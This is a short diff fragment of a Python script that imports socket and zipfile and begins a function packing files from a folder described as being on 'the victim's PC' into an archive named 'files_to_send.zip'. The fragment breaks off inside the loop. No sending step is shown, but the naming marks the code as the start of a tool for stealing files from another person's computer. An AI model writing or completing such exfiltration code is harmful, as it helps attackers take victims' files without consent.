@@ -2,7 +2,6 @@ import socket
 import zipfile
 import os
 
-# Create a ZIP archive from .exe files in the specified folder
 def create_zip():
     with zipfile.ZipFile('files_to_send.zip', 'w') as zipf:
         for file in os.listdir(r"directory to files that are opened on the victim's PC"): # 
